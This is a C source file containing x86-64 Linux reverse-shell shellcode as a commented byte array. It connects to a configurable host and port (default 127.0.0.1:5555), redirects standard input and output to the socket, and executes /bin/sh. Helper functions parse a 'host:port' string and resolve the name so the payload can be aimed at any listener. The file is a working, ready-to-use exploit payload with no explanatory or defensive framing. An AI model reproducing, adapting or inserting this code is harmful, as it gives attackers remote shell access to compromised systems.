#define _GNU_SOURCE
#include <assert.h>
#include <netdb.h>	// for gethostbyname()
#include <stdio.h>

#include "shellcode.h"

static const ShellcodeUnion scu0 = {
	.raw = {
		0x6a, 0x29,					// pushq	$0x29
		0x58,						// pop		%rax
		0x99, 						// cltd
		0x6a, 0x02,					// pushq	$0x2
		0x5f,						// pop		%rdi
		0x6a, 0x01, 					// pushq	$0x1
		0x5e,						// pop		%rsi
		0x0f, 0x05,					// syscall
		0x48, 0x97,					// xchg		%rax,%rdi
		0x48, 0xb9, 0x02, 0x00,				// movabs	$0x100007fb3150002,%rcx
		0x15, 0xb3,					// .WORD	htons(5555)
		0x7f, 0x00, 0x00, 0x01,				// .DWORD	127.0.0.1
		0x51,						// push		%rcx
		0x48, 0x89, 0xe6,				// mov		%rsp,%rsi
		0x6a, 0x10,					// pushq	$0x10
		0x5a,						// pop		%rdx
		0x6a, 0x2a,					// pushq	$0x2a
		0x58,						// pop		%rax
		0x0f, 0x05,					// syscall
		0x6a, 0x03,					// pushq	$0x3
		0x5e,						// pop		%rsi
		0x48, 0xff, 0xce,				// dec		%rsi
		0x6a, 0x21,					// pushq	$0x21
		0x58,						// pop		%rax
		0x0f, 0x05,					// syscall
		0x75, 0xf6,					// jne		27<dup2_loop>
		0x6a, 0x3b,					// pushq	$0x3b
		0x58,						// pop		%rax
		0x99,						// cltd
		0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f,	// movabs	$0x68732f6e69622f,%rbx
		0x73, 0x68, 0x00,				//
		0x53,						// push		%rbx
		0x48, 0x89, 0xe7,				// mov		%rsp,%rdi
		0x52,						// push		%rdx
		0x57,						// push		%rdi
		0x48, 0x89, 0xe6,				// mov		%rsp,%rsi
		0x0f, 0x05					// syscall
	}
}; // scu0

void initShellcodeUnion(ShellcodeUnionPtr scup) {
	*scup=scu0;
        scup->sc.port = htons(5555);
        if (!inet_aton("127.0.0.1", &scup->sc.ipAddress))
                assert(0); // This should ALWAYS work.
} // initShellcode()

ssize_t makeShellcode(ShellcodePtr scp, char *p, ssize_t np) {
        char s_host[256];
        unsigned short nport;
        int nc = 0, ns = sscanf(p, "%[A-Za-z0-9-.]%n:%hu%n", s_host, &nc, &nport, &nc);
        assert(ns >= 0 && ns <= 2);

        scp->port = htons((ns > 1) ? nport : 5555);

        // See if the s_host string can be parsed by inet_aton()
        if (inet_aton(s_host, &scp->ipAddress) == 0)
                for (struct hostent *he = gethostbyname(s_host); he; he = NULL)
                        for (int i = 0; ((struct in_addr **) he->h_addr_list)[i] != NULL; i++)
                                scp->ipAddress = *((struct in_addr **) he->h_addr_list)[i];

        // Return number of characters consumed parsing the Host and IP Address.
        return nc;
} // makeShellcode()

void dumpShellcode(ShellcodePtr scp) {
	fprintf(stderr, "--------------------------------------------\n");
	fprintf(stderr, "%20s: %d\n",		"scp->port",		ntohs(scp->port));
	fprintf(stderr, "%20s: %s\n",		"scp->ipAddress",	inet_ntoa(scp->ipAddress));
} // dumpShellcode()

